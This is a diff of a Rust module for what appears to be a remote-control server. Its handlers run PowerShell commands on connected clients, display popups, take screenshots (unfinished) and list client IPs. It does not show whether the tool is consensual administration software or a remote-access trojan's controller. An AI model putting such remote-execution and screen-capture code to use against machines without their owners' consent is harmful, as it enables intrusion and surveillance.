@@ -1,132 +1,98 @@
-use std::sync::{Arc, Mutex};
-use lib::{Command, CommandErr, send_data};
-use crate::{ClientHandle, HandleVec};
-use lib::CommandErr::*;
-
-
+use lib::{Command};
+use crate::client::ClientHandle;
+use crate::error::CommandErr;
+use crate::error::CommandErr::*;
 
 
 /// Echoes a message to a given client
-pub fn echo(args: Vec<&str>, handles: &HandleVec) -> Result<String, CommandErr> {
-    if args.len() <= 2 {
-        return Err(ArgNumErr("Incorrect number of arguments. Usage: echo [IP] [MESSAGE]"))
+pub(crate) fn echo(handle: ClientHandle, message: String) -> Result<String, CommandErr> {
+    let ip = &handle.ip;
+    if let Some(buf) = handle.send_to_client(Command::Echo, message.to_string()) {
+        let response: String = serde_json::from_slice(&buf)?;
+        Ok(format!("Successfully echoed message {} to client with IP {}. Response: {}", message, ip, response))
+    } else {
+        Err(SendMessageErr(format!("An error occurred while sending message {} to client with IP {}", message, ip), ip.to_string()))
     }
-
-    let ip = args[1].to_string();
-    let message = args[2..].join(" ");
-
-    for handle in handles.lock().unwrap().iter() {
-        if handle.ip == ip {
-            return if let Some(buf) = handle.send_to_client(Command::Echo, message.clone()) {
-                let response: String = serde_json::from_slice(&buf)?;
-                Ok(format!("Successfully echoed message {} to client with IP {}. Response: {}", message, ip, response))
-            } else {
-                Err(SendMessageErr(format!("An error occurred while sending message {} to client with IP {}", message, ip), ip))
-            }
-        }
-    }
-    Err(NoClientsErr("No clients exist"))
 }
 
 /// Echoes a message to all clients
-pub fn echoall(args: Vec<&str>, handles: &HandleVec) -> Result<String, CommandErr> {
-    if args.len() == 1 {
-        return Err(ArgNumErr("Incorrect number of arguments. Usage: echoall [MESSAGE]"))
-    }
-    
-    let mut echo_attempt = false;
-
-    let message = args[1..].join(" ");
+pub(crate) fn echoall(handles: Vec<ClientHandle>, message: String) -> Result<String, CommandErr> {
+    log::trace!("Echoall command started");
 
     let mut error_vec: Vec<CommandErr> = Vec::new();
     
-    for handle in handles.lock().unwrap().iter() {
-        if let Some(buf) = handle.send_to_client(Command::Echo, message.clone()) {
-            let response: String = serde_json::from_slice(&buf)?;
-            log::info!("Successfully echoed message {} to client with IP {}. Response: {}", message, handle.ip, response);
-            echo_attempt = true;
-        } else {
-            error_vec.push(SendMessageErr(format!("An error occurred while sending message {} to client with IP {}", message, handle.ip), handle.ip.clone()));
-            echo_attempt = true;
+    if handles.is_empty() {
+        return Err(NoClientsErr("No clients exist"));
+    }
+    // Vec might be deadlocked in popup, since it takes a ClientHandle and never returns it
+    for handle in handles.iter() {
+        dbg!(&handle.ip);
+        if let Err(err) = echo(handle.clone(), message.clone()) {
+            error_vec.push(err);
         }
     }
 
-    // Check if any clients exist
-    if !echo_attempt {
-        return Err(NoClientsErr("No clients exist"));
-    }
-    
+    log::trace!("about to return");
+
     match error_vec.len() {
         0 => Ok(format!("Successfully sent message {} to all clients", message)),
         1 => Err(error_vec[0].clone()),
         _ => Err(MultipleErr(error_vec)),
     }
-    
 }
 
 /// Runs a Powershell command on a given client
-pub fn run(args: Vec<&str>, handles: &HandleVec) -> Result<String, CommandErr> {
-    if args.len() <= 2 {
-        return Err(ArgNumErr("Incorrect number of arguments. Usage: run [IP] [COMMAND]"))
-    }
-    let ip = args[1].to_string();
-
-    // Join every argument past the IP into a single command to run
-    let command = args[2..].join(" ");
-
+pub(crate) fn run(handle: ClientHandle, command: String) -> Result<String, CommandErr> {
     log::trace!("Sending command: {}", command);
-    for handle in handles.lock().unwrap().iter() {
-        if handle.ip == ip {
-            return if let Some(buf) = handle.send_to_client(Command::Run, command.clone()) {
-                let response: String = serde_json::from_slice(&buf)?;
-                Ok(format!("Successfully sent command {} to client with IP {}. Response: {}", command, handle.ip, response))
-            } else {
-                Err(SendMessageErr(format!("An error occurred while sending command {} to client with IP {}", command, handle.ip), ip))
-            }
-        }
+
+    if let Some(buf) = handle.send_to_client(Command::Run, command.clone()) {
+        let response: String = serde_json::from_slice(&buf)?;
+        Ok(format!("Successfully sent command {} to client with IP {}. Response: {}", command, handle.ip, response))
+    } else {
+        Err(SendMessageErr(format!("An error occurred while sending command {} to client with IP {}", command, handle.ip.clone()), handle.ip))
     }
-    Err(NoClientsErr("No clients exist"))
 }
 
 /// Makes a Windows popup message appear on a client's computer
-pub fn popup(args: Vec<&str>, handles: &HandleVec) -> Result<String, CommandErr> {
-    if args.len() <= 2 {
-        return Err(ArgNumErr("Incorrect number of arguments. Usage: popup [IP] [MESSAGE]"))
+pub(crate) fn popup(handle: ClientHandle, message: String) -> Result<String, CommandErr> {
+    if handle.send_to_client(Command::Message, message.clone()).is_some() {
+        Ok(format!("Successfully sent popup with message {} to client with IP {}.", message, handle.ip))
+    } else {
+        Err(SendMessageErr(format!("An error occurred while sending command {} to client with IP {}", message, handle.ip.clone()), handle.ip))
     }
+}
 
-    let ip = args[1].to_string();
-    let message = args[2..].join(" ");
-
-    for handle in handles.lock().unwrap().iter() {
-        if handle.ip == ip {
-            return if handle.send_to_client(Command::Message, message.clone()).is_some() {
-                Ok(format!("Successfully sent popup with message {} to client with IP {}.", message, handle.ip))
-            } else {
-                Err(SendMessageErr(format!("An error occurred while sending command {} to client with IP {}", message, handle.ip), ip))
-            }
-        }
-    }
-    Err(NoClientsErr("No clients exist"))
+/// Screenshots a given client's screen and saves it to a file.
+pub(crate) fn screenshot(handle: ClientHandle) -> Result<String, CommandErr> {
+    handle.send_to_client(Command::Screenshot, String::new());
+    Ok("Screenshot command is unfinished. No files were saved".to_string())
 }
 
 /// Lists every client IP
-pub fn list(handles: &HandleVec) -> Result<String, CommandErr> {
-    let mut client_vec = Vec::new();
-    for handle in handles.lock().unwrap().iter() {
-        client_vec.push(handle.ip.clone());
+pub(crate) fn list(handles: Vec<ClientHandle>) -> Result<String, CommandErr> {
+    if handles.is_empty() {
+        return Err(NoClientsErr("No clients exist"));
     }
-    if client_vec.is_empty() {
-        return Err(NoClientsErr("No clients exist"))
+    for handle in handles.iter() {
+        log::info!("{}", handle.ip)
     }
-    Ok(client_vec.join("\n"))
+    if handles.len() == 1 {
+        Ok("Found 1 client".to_string())
+    } else {
+        Ok(format!("Found {} clients", handles.len()))
+    }
 }
 
-pub fn heartbeat(handles: &HandleVec) {
-    let mut handle_vec = handles.lock().unwrap();
-    for (n, handle) in handle_vec.clone().iter().enumerate() {
-        if handle.send_to_client(Command::Send, String::from("thump")).is_none() {
-            log::debug!("Client with IP {} has disconnected", handle.ip);
-            handle_vec.remove(n);
-        }
-    }
+pub(crate) fn print_help() -> Result<String, CommandErr> {
+    Ok("\nAvailable commands:\n\
+        \n\
+        echo <ip> <message>     - Send a message to a specific client and receive the same message back\n\
+        echoall <message>       - Send a message to all connected clients\n\
+        run <ip> <command>      - Execute a PowerShell command on a specific client\n\
+        popup <ip> <message>    - Display a popup message on a specific client's screen\n\
+        screenshot <ip>         - Take a screenshot of a specific client's screen (currently unfinished)\n\
+        list                    - Show all connected client IPs\n\
+        help                    - Show this help message\n\
+        \n\
+        Note: <ip> should be the full IP address of the client as shown by the 'list' command".to_string())
 }
